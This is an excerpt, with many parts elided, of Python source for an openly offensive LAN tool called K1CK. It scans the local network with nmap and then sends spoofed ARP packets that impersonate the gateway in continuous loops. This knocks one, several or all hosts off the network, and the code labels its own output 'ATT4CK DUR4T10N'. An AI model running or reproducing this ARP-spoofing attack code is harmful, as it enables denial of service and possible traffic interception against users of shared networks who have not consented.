...
class K1CK():
    ...
    def scanNetwork(self):
        ...
        try:
            ...
            gateway = ".".join(self.defaultGatewayIP.split(".")[:-1] + ['0'])
            for i in routing:
           ...
           # Scanning Network using nmap
            nm = nmap.PortScanner()
            scanDict = nm.scan(hosts=self.GatewayInterface, arguments='-n -sP -PE')
            self.onlineIPs = nm.all_hosts()
            self.IPlist = self.onlineIPs
            self.IPlist.remove(self.defaultInterfaceIP)
            self.hostsList = [[x,nm[x]['addresses']['mac']] for x in self.IPlist]
            self.macList = [[nm[x]['addresses']['mac']] for x in self.IPlist]
            self.defaultGatewayMac = nm[self.defaultGatewayIP]['addresses']['mac']
    ...
    def K1CKoneoff(self):
        ...
        for i,j in enumerate(self.hostsList):
            ip = self.hostsList[i][0]
            mac = self.hostsList[i][1]
            vendor = self.resolveMac(mac)
        ...
        while not canBreak:
            try:
                ...
                one_target_ip = self.hostsList[choice][0]
                one_target_mac = self.hostsList[choice][1]
                vendor = self.resolveMac(one_target_mac)
                canBreak = True
            except:
        ...
        try:
            ...
            while True:
                ...
                R_spoof.sendPacket(self.defaultInterfaceMAC, self.defaultGatewayIP, one_target_ip, one_target_mac)
    ...
    def K1CKsomeoff(self):
        ...
        try:
            for i in some_targets:
                some_ipList.append(self.hostsList[int(i)][0])
                some_ipMac.append(self.hostsList[int(i)][1])
        ...
        try:
            ...
            while True:
                # broadcast malicious ARP packets (10p/s)
                for i in some_targets:
                    R_spoof.sendPacket(self.defaultInterfaceMAC, self.defaultGatewayIP, self.hostsList[int(i)][0], self.hostsList[int(i)][1])
                    elapsed = timedelta(seconds = round(time.time() - start))
                    print("\r \t {0}  ATT4CK DUR4T10N :- {1} seconds{2} \n".format(YELLOW,elapsed,END),end="")
                time.sleep(10)
        except KeyboardInterrupt:
            return
    ...
    def K1CKalloff(self):
        ...
        for i in range(len(self.IPlist)):
            ...
            for host in self.hostsList:
                if host[0] == self.IPlist[i]:
                    mac = host[1]
            vendor = self.resolveMac(mac)
            print(" {0}[{5}]\t{1}{6}\t{2}{7}\t{3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END,i,self.IPlist[i],mac,vendor))
        ...
        try:
            ...
            while True:
                for host in self.hostsList:
                    if host[0] != self.defaultGatewayIP:
                        # dodge gateway (avoid crashing network itself)
                        R_spoof.sendPacket(self.defaultInterfaceMAC, self.defaultGatewayIP, host[0], host[1])
                        elapsed = timedelta(seconds = round(time.time() - start))
                        print("\r \t {0}  ATT4CK DUR4T10N :- {1} seconds{2} \n".format(YELLOW,elapsed,END),end="")
                reScan += 1
                if reScan == 4:
    ...
    def main(self):
        self.heading()
        print("\n{0}Using interface {1}{10}{2} with mac address {3}{11}{4}.\nGateway IP: {5}{12}{6} --> {7}{13}{8} hosts are up.{9}".format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END,self.defaultInterface,self.defaultGatewayMac,self.defaultGatewayIP,len(self.hostsList)))
        # display warning in case of no active hosts
        if len(self.hostsList) == 1:
            if self.hostsList[0][0] == self.defaultGatewayIP:
